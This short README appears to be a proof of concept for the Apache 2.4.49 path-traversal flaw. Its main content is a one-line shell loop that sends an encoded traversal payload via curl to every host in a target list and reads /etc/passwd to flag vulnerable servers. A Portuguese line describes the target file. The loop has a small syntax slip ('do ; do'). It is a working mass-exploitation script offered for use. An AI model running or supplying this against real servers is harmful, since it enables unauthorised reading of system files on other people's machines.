# PoCApache2.4.49

```cat targets.txt | while read host do ; do curl --silent --path-as-is --insecure "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | grep "root:*" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n";done```

targets.txt -> Lista onde conterá todos alvos que serão testados.

PoC image:
<img src="https://imgur.com/FsNVxGL.png">
